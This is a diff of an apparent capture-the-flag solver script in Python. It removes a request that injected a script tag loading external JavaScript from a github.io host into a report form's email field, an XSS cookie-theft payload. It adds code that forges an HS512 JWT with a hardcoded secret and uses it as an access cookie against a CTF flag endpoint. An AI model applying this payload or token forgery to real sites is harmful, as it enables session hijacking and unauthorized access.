@@ -1,22 +1,36 @@
+import jwt
+
+header = {"typ": "JWT","alg": "HS512"}
+payload = {"subject_id":1,"exp":1730300990}
+
+secret_key = "3gHsCBkpZLi99zyiPqfY/NfFJqZzmNL4BAhYN8rAjRn49baTcnmyGISLD6T58XcWIUYrBfltI2iq2N6OHQSrfqBRFxFta61PvmnfRyn8Ep8T55lvLT8Es62kN3x35Bcb0OZmOGmM/zKf2qadcBq3Nbq1MiIVKJMz4w3JOk4orwFPtSNpNh8uaSQQUNMKTT6cvD9bvRvFNeeHYSPhDFwayPIRr5TJ+BpIRTUTfc1C3WCKoOuXCz2t+ISZo5yYwZ6U5w7NKFTTuDqMP/dXevkVykuntdej55XE3fsCP+UVFUT2JrY+Z9Q1aKTgavQR5smYVn93RlpbFwCoSStoANnoi"
+
+jwt_token = jwt.encode(payload, secret_key, headers=header, algorithm="HS512")
+
+print(jwt_token)
+
+
+def convert_unicode_escape_to_ascii(input_string):
+    decoded_string = input_string.encode().decode("unicode_escape")
+
+    return decoded_string
+
+
+# exit(0)
 import requests
 
-headers = {
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-    'Accept-Language': 'en-US,en;q=0.5',
-    'DNT': '1',
-    'Sec-GPC': '1',
-    'Connection': 'keep-alive',
-    'Referer': 'http://host3.metaproblems.com:6020/index.php',
-    'Upgrade-Insecure-Requests': '1',
-    'Priority': 'u=1',
+cookies = {
+    # "access_token": "eyJhbGciOiJIUzI1NiIsImtpZCI6InBhc3Nlbmdlcl9rZXkiLCJ0eXAiOiJKV1QifQ.eyJ0eXBlIjoicGFzc2VuZ2VyIn0.EqwTzKXS85U_CbNznSxBz8qA1mDZOs1JomTXSbsw0Zs",
+    "access_token": jwt_token,
 }
 
-params = {
-    'report_url': """http://host3.metaproblems.com:6020/report.php?report_url=http%3A%2F%2Fhost3.metaproblems.com%3A6020%2Fcookies.php&report_email="<SCRIPT/SRC='http://amazingrupak.github.io/hi.js'></SCRIPT>"@hi.com""",
-    'report_email': "hi@hi.com",
-}
+headers = {}
 
-r = requests.get('http://host3.metaproblems.com:6020/report.php', params=params, headers=headers)
-
-print(r.text)
+response = requests.post(
+    "https://forensics-emuc2-b6abd8652aa4.2024.ductf.dev/api/flag/", cookies=cookies, headers=headers
+)
+# print(response.text)
+print(convert_unicode_escape_to_ascii(response.text))
+# print(response.headers)
+# print(response.cookies)
+# print(response.status_code)
